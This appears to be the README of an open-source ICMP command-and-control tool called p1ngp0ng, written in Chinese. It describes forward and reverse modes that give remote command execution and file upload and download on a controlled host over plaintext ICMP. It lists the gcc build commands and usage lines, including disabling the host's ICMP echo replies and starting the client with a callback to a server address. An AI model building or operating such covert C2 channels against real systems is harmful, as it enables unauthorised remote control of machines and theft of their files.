# p1ngp0ng                
轻量级ICMP C2工具                
                
# 依赖                
Linux环境与GCC套件。                
                
# 功能：                
**p1ng：**                
p1ng，实现C2服务器正向连接被控端。目前实现了对客户端的命令控制与文件上传下载。明文传输，未加密。                
                
**p0ng：**                
p0ng，实现被控端反向连接C2服务器。目前实现了对客户端的命令控制与文件上传下载。明文传输，未加密。                
                
# 编译                
gcc p1ng.c -o p1ng                
gcc p0ng.c -lpthread -o p0ng                
                
# 使用                
**p1ng：**                
c2服务端：p1ng -S -c ${client_ip}                
c2被控端：echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all                
&nbsp;&nbsp;&nbsp;&nbsp;p1ng -C                
![main-panel](https://github.com/aplyc1a/p1ngp0ng/blob/master/logo.png)                
![p1ng-simple-usage](https://github.com/aplyc1a/p1ngp0ng/blob/master/p1ng_usage.png)                
                
**p0ng：**                
c2服务端：echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all         
&nbsp;&nbsp;&nbsp;&nbsp;p0ng -S                
c2被控端：                
p0ng -C -s ${server_ip}               
